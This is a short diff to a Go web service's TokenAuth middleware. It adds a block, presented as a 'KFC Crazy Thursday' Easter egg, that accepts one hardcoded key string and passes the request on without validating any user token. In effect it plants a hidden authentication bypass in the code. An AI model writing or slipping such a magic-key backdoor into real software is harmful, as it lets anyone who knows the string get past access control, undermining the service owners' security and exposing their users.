@@ -329,6 +329,14 @@ func TokenAuth() func(c *gin.Context) {
 			parts = strings.Split(key, "-")
 			key = parts[0]
 		}
+
+		// 🍗 Easter egg: KFC Crazy Thursday
+		if key == "todayisthursdayvw50woyaochikendeji" {
+			c.Set("kfc_thursday_easter_egg", true)
+			c.Next()
+			return
+		}
+
 		token, err := model.ValidateUserToken(key)
 		if token != nil {
 			id := c.GetInt("id")
